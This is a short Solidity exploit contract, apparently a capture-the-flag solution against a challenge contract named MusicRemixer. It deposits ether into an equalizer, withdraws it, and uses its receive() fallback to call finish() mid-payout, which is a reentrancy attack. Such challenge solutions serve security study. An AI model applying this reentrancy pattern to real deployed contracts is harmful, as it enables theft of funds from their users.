// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {MusicRemixer} from "./challenge/MusicRemixer.sol";

contract Exploit {
    MusicRemixer musicRemixer;

    function exploit(address musicRemixerAddr) public payable {
        musicRemixer = MusicRemixer(musicRemixerAddr);
        musicRemixer.equalizer().increaseVolume{value: msg.value}([uint256(msg.value), 0, 0]);
        uint256 volume = musicRemixer.equalizer().volumeGainOf(address(this));
        musicRemixer.equalizer().decreaseVolume(volume);
    }

    receive() external payable {
        musicRemixer.finish();
    }
}
